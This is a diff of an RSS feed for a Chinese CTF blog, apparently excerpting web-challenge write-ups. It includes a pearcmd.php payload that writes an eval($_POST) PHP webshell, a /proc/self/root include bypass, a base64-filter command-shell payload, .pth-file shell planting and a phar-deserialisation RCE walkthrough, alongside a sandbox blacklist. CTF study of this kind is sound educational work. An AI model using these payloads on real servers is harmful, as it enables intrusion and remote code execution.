@@ -3,7 +3,43 @@
         <title>Ctf - Category - ThnPinkman’s blog</title>
         <link>https://thnpkm.github.io/categories/ctf/</link>
         <description>Ctf - Category - ThnPinkman’s blog</description>
-        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</lastBuildDate><atom:link href="https://thnpkm.github.io/categories/ctf/" rel="self" type="application/rss+xml" /><item>
+        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</lastBuildDate><atom:link href="https://thnpkm.github.io/categories/ctf/" rel="self" type="application/rss+xml" /><item>
+    <title>NSS#roun8 web专项赛</title>
+    <link>https://thnpkm.github.io/posts/ctf/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B/</link>
+    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/ctf/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B/</guid>
+    <description><![CDATA[MyPage Where is my page？
+拿到题目就是这个样子
+感觉就是文件包含
+可以读取，可以用filter协议
+但是index.php怎么尝试都没读取到,data和input等协议都被ban了
+方法一： pearcmd.php filter读取不到index.php，可以试试pearcmd.php的姿势写shell
+index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_POST[1]);?&gt;+/tmp/shell.php 利用文件包含漏洞包含这个文件即可
+方法二：多级连接绕过 /proc/self/root/多级连接绕过 include_once
+?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/index.php ?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/flag.php 注意最后是proc/self/cwd/
+index.php源码是
+&lt;?php error_reporting(0); include &#39;flag.php&#39;; if(!isset($_GET[&#39;file&#39;])) { header(&#39;Location:/index.php?file=&#39;); } else { $file = $_GET[&#39;file&#39;]; if (!preg_match(&#39;/\.\.|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#39;, $file)) { include_once $file; } else { die(&#39;error.&#39;); } } include_once 不能重复包含,然后上面已经有include 'flag.php' 包含了，所以读不到flag.php
+至于不能正常读到index.php我比较迷惑，应该是执行这个文件其实已经算包含一遍了，也是include_once的问题，换成include就可以正常读。
+/proc/self/root/多级连接绕过原理可参考此文
+require_once 绕过不能重复包含文件的限制方法三： PHP Base64 Filter 宽松解析 我在写这题时候 用了这个方法，不过payload生成可能产生一点问题,复现倒是很顺
+&lt;?php $base64_payload = &#34;PD89YCRfR0VUWzBdYDs7Pz4&#34;; /* &lt;?=`$_GET[0]`;;?&gt; */ $conversions = array( &#39;R&#39; =&gt; &#39;convert.]]></description>
+</item>
+<item>
+    <title>Python pth文件写入getshell</title>
+    <link>https://thnpkm.github.io/posts/ctf/python-pth%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/</link>
+    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/ctf/python-pth%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/</guid>
+    <description><![CDATA[原理：Python pth文件写入getshell 参考https://www.cnblogs.com/Nestar/p/17336664.html
+python的site模块支持&quot;Site-specific configuration hook&quot;的功能，这个功能点本身是用来将特定路径加入模块搜索路径。该模块在初始化期间自动导入
+sys.prefix和sys.exec_prefix在D:/Python，那么创建路径为D:\Python\Lib\site-packages\1.pth的pth文件，然后其内容为
+D:/Python/temp/ 重新启动python
+1.path的路径被添加到sys.path中
+site.py的实现中，有这么一段
+def addpackage(sitedir, name, known_paths): if known_paths is None: known_paths = _init_pathinfo() reset = True else: reset = False fullname = os.path.join(sitedir, name) _trace(f&#34;Processing .pth file: {fullname!r}&#34;) try: # locale encoding is not ideal especially on Windows. But we have used # it for a long time. setuptools uses the locale encoding too. f = io.TextIOWrapper(io.open_code(fullname), encoding=&#34;locale&#34;) except OSError: return with f: for n, line in enumerate(f): if line.]]></description>
+</item>
+<item>
     <title>0xgame2022</title>
     <link>https://thnpkm.github.io/posts/ctf/0xgame2022/</link>
     <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
@@ -128,42 +164,6 @@ f= open(&#39;1.txt&#39;) lines = f.readlines() for line in lines: print(line[17:
 black_char = [ &#34;&#39;&#34;, &#39;&#34;&#39;, &#39;.&#39;, &#39;,&#39;, &#39; &#39;, &#39;+&#39;, &#39;__&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;str&#39;, &#39;import&#39;, &#39;except&#39;, &#39;if&#39;, &#39;for&#39;, &#39;while&#39;, &#39;pass&#39;, &#39;with&#39;, &#39;assert&#39;, &#39;break&#39;, &#39;class&#39;, &#39;raise&#39;, &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, ] for char in black_char: if char in cmd: return f&#39;failed: `{char}`&#39; msg = &#34;success&#34; try: eval(cmd) except Exception: msg = &#34;error&#34; 关于python的一些trick，记录一下,可以通过len() int()函数等拿到数字
 例如：
 int(len(black_char)) == 31 int(char) == 9 int(black_char[len(black_char)-int(char)]) == 1 可以利用black_char下标拿到任何黑名单 len([]) == 0 len(black_char[len([])]) ==1 int(False)==0 ~int(False)==-1 -~int(False)==1 &lt;&lt; 是一个位移运算符，用于将一个操作数的二进制表示向左移动指定的位数 &lt;&lt; 1 相当于 乘以2的1次方 | 是一个按位或运算符 5|6 == 7 亚军的exp，用的repr(request) 自己这里打不通]]></description>
-</item>
-<item>
-    <title>DAS x SU</title>
-    <link>https://thnpkm.github.io/posts/ctf/das-x-su/</link>
-    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
-    <author>Author</author>
-    <guid>https://thnpkm.github.io/posts/ctf/das-x-su/</guid>
-    <description><![CDATA[WEB pdf_converter 大家都非预期了
-发现是ThinkPHP5 的框架
-直接可以随便用公开的payload直接打
-pdf_converter_revenge 这个找cve是找错了，然后访问pdf函数这里还是有迷惑，
-现在知道了是index.php/index/index/pdf 当时一直是尝试index.php/index/pdf
-正确思路是CVE-2022-41343 - 通过 Phar 反序列化的 RCE
-https://buaq.net/go-129526.html跟着文章复现
-直接跑这个脚本，但是有个font库需要安装sudo apt-get install python3-fontforge
-#!/usr/bin/env python3 import fontforge import os import sys import tempfile from typing import Optional def main(): sys.stdout.buffer.write(do_generate_font()) def do_generate_font() -&gt; bytes: fd, fn = tempfile.mkstemp(suffix=&#34;.ttf&#34;) os.close(fd) font = fontforge.font() font.copyright = &#34;DUMMY FONT&#34; font.generate(fn) with open(fn, &#34;rb&#34;) as f: res = f.read() os.unlink(fn) result = res return result if __name__ == &#34;__main__&#34;: main() 获取一个font.]]></description>
-</item>
-<item>
-    <title>DASCTF 7月</title>
-    <link>https://thnpkm.github.io/posts/ctf/dasctf-7%E6%9C%88/</link>
-    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
-    <author>Author</author>
-    <guid>https://thnpkm.github.io/posts/ctf/dasctf-7%E6%9C%88/</guid>
-    <description><![CDATA[ezFAT32 010打开img文件
-得到压缩包密码的hint，去提取一下bmp文件
-刚开始还是手动提取的，还迷惑提取的精确度，搞忘掉了是取证题
-R-studio 可以梭出来
-bmp文件 计算一下sha256
-拿到密码1bec3826d44f706d33e8cc4bc230d3113d0198261ff1cd251294dbdebabb0af5
-打开flag就可
-Coffee desu！ 尝试了POST方法后 报错 并且给了几个方法
-去搜这个报错
-https://datatracker.ietf.org/doc/html/rfc2324对应上了You should add the milktea before getting the coffee!
-题目要求加milktea
-就加一个请求头
-Accept-Additions: milktea 添加后GET访问即可]]></description>
 </item>
 </channel>
 </rss>
